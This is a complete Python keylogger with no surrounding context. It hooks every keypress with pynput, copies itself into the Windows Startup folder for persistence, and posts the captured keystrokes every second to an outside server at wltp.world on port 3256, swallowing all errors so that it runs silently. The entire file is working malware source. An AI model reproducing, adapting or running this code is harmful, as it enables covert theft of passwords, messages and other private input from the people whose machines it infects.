from pynput.keyboard import Listener
import urllib.request, urllib.parse, threading, time, os, getpass, shutil, sys

log, lock = '', threading.Lock()
url = 'http://www.wltp.world:3256/get_logs'

def startup():
    try:
        src = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        dst = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', os.path.basename(src))
        if src != dst and not os.path.exists(dst):
            shutil.copy(src, dst)
    except: pass

def send():
    global log
    while True:
        time.sleep(1)
        with lock:
            if log:
                try:
                    data = urllib.parse.urlencode({'logs': log}).encode()
                    urllib.request.urlopen(urllib.request.Request(url, data=data))
                    log = ''
                except: pass

def on_press(k):
    global log
    with lock: log += str(k).strip("'") + ','

startup()
threading.Thread(target=send, daemon=True).start()
with Listener(on_press=on_press) as l: l.join()
